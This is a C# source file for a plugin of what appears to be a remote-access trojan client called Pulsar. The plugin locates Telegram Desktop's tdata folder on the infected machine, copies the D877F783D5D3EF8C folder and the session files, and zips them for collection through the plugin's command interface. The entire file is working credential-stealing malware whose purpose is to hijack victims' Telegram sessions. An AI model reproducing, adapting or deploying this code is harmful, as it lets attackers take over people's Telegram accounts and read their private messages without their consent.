using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using Pulsar.Common.Plugins;

namespace Pulsar.Client.Plugins.TelegramTData.Client
{
    public sealed class TelegramTDataClientPlugin : IUniversalPlugin
    {
        public string PluginId => "TelegramTData.Client";
        public string Version => "1.0.0";
        public string[] SupportedCommands => new[] { "ListTelegramProcesses", "CollectTData" };

        private bool _isComplete;
        public bool IsComplete => _isComplete;

        public void Initialize(object initData)
        {
            _isComplete = false;
        }

        public PluginResult ExecuteCommand(string command, object parameters)
        {
            try
            {
                switch (command)
                {
                    case "ListTelegramProcesses":
                        return ListTelegramProcesses();
                    case "CollectTData":
                        return CollectTData();
                    default:
                        return Fail("Unknown command: " + command);
                }
            }
            catch (Exception ex)
            {
                return Fail("Error: " + ex.Message);
            }
        }

        /// <summary>
        /// Given a Telegram process, locate its tdata directory.
        /// Priority: exe directory (portable) -> Roaming AppData -> Local AppData
        /// </summary>
        private string ResolveTDataPath(Process proc)
        {
            try
            {
                var exePath = proc.MainModule?.FileName;
                if (string.IsNullOrEmpty(exePath))
                    return null;

                var exeDir = Path.GetDirectoryName(exePath);
                if (string.IsNullOrEmpty(exeDir))
                    return null;

                // 1. Portable: tdata in same directory as exe
                var tdata = Path.Combine(exeDir, "tdata");
                if (Directory.Exists(tdata))
                    return tdata;

                // 2. Installed version: %AppData%\Roaming\Telegram Desktop\tdata
                var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                tdata = Path.Combine(roaming, "Telegram Desktop", "tdata");
                if (Directory.Exists(tdata))
                    return tdata;

                // 3. Alternative: %LocalAppData%\Telegram Desktop\tdata
                var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                tdata = Path.Combine(local, "Telegram Desktop", "tdata");
                if (Directory.Exists(tdata))
                    return tdata;
            }
            catch { }

            return null;
        }

        /// <summary>
        /// Find any tdata path from running Telegram processes or known locations.
        /// </summary>
        private string FindAnyTDataPath()
        {
            // Try through running processes first
            try
            {
                var processes = Process.GetProcessesByName("Telegram");
                foreach (var proc in processes)
                {
                    var tdata = ResolveTDataPath(proc);
                    if (tdata != null)
                        return tdata;
                }
            }
            catch { }

            // Fallback: if no process running, check standard locations
            var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var tdataPath = Path.Combine(roaming, "Telegram Desktop", "tdata");
            if (Directory.Exists(tdataPath))
                return tdataPath;

            var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            tdataPath = Path.Combine(local, "Telegram Desktop", "tdata");
            if (Directory.Exists(tdataPath))
                return tdataPath;

            return null;
        }

        private PluginResult ListTelegramProcesses()
        {
            try
            {
                var processes = Process.GetProcessesByName("Telegram");
                var entries = new System.Collections.Generic.List<string>();

                if (processes.Length > 0)
                {
                    foreach (var proc in processes)
                    {
                        try
                        {
                            var tdataPath = ResolveTDataPath(proc);
                            if (tdataPath != null)
                            {
                                entries.Add($"{proc.Id}|{tdataPath}");
                            }
                            else
                            {
                                entries.Add($"{proc.Id}|NOT_FOUND");
                            }
                        }
                        catch
                        {
                            entries.Add($"{proc.Id}|ERROR");
                        }
                    }
                }
                else
                {
                    // No process running, try to find tdata anyway
                    var tdataPath = FindAnyTDataPath();
                    if (tdataPath != null)
                    {
                        entries.Add($"0|{tdataPath}");
                    }
                }

                if (entries.Count == 0)
                {
                    return Fail("No Telegram processes or tdata found");
                }

                var result = string.Join("|", entries);
                return Ok(result, "ListTelegramProcesses");
            }
            catch (Exception ex)
            {
                return Fail("ListTelegramProcesses error: " + ex.Message);
            }
        }

        private PluginResult CollectTData()
        {
            try
            {
                var tdataPath = FindAnyTDataPath();

                if (tdataPath == null)
                {
                    return Fail("tdata directory not found");
                }

                // Create temporary directory for collection
                var tempDir = Path.Combine(Path.GetTempPath(), "TelegramTData_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(tempDir);

                try
                {
                    // Copy D877F783D5D3EF8C folder
                    var sourceFolder = Path.Combine(tdataPath, "D877F783D5D3EF8C");
                    if (Directory.Exists(sourceFolder))
                    {
                        var destFolder = Path.Combine(tempDir, "D877F783D5D3EF8C");
                        CopyDirectory(sourceFolder, destFolder);
                    }

                    // Copy all files ending with 's' (session files)
                    var sFiles = Directory.GetFiles(tdataPath, "*s");
                    foreach (var file in sFiles)
                    {
                        var destFile = Path.Combine(tempDir, Path.GetFileName(file));
                        File.Copy(file, destFile, true);
                    }

                    // Create zip file in temp directory
                    var zipPath = Path.Combine(Path.GetTempPath(), $"tdata_{DateTime.Now:yyyyMMdd_HHmmss}.zip");
                    ZipFile.CreateFromDirectory(tempDir, zipPath);

                    return Ok(zipPath, "CollectTData");
                }
                finally
                {
                    try
                    {
                        if (Directory.Exists(tempDir))
                            Directory.Delete(tempDir, true);
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                return Fail("CollectTData error: " + ex.Message);
            }
        }

        private void CopyDirectory(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);

            foreach (var file in Directory.GetFiles(sourceDir))
            {
                File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
            }

            foreach (var dir in Directory.GetDirectories(sourceDir))
            {
                CopyDirectory(dir, Path.Combine(destDir, Path.GetFileName(dir)));
            }
        }

        private PluginResult Ok(string message, string command)
        {
            return new PluginResult
            {
                Success = true,
                Message = message,
                NextCommand = command,
                Data = null,
                ShouldUnload = false
            };
        }

        private PluginResult Fail(string message)
        {
            return new PluginResult
            {
                Success = false,
                Message = message,
                Data = null,
                ShouldUnload = false
            };
        }

        public void Cleanup()
        {
            _isComplete = true;
        }
    }
}
